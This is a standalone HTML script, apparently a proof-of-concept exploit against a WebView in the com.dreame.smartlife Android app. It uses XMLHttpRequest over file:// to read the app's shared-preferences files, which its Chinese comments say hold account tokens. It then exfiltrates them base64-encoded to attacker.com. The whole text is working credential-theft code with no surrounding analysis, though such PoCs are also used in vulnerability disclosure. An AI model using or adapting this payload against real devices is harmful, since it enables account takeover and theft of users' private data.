<script>
    function stealFile(path) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                // 将窃取的内容发送到攻击者服务器
                fetch('https://attacker.com/log?path=' + path + '&data=' + btoa(xhr.responseText));
            }
        };
        xhr.open('GET', 'file://' + path, true);
        xhr.send();
    }
    // 窃取包含 Token 的账号配置文件
    stealFile('/data/data/com.dreame.smartlife/shared_prefs/sp_account.xml');
    // 窃取通用偏好设置文件
    stealFile('/data/data/com.dreame.smartlife/shared_prefs/android.dreame.module_preferences.xml');
</script>
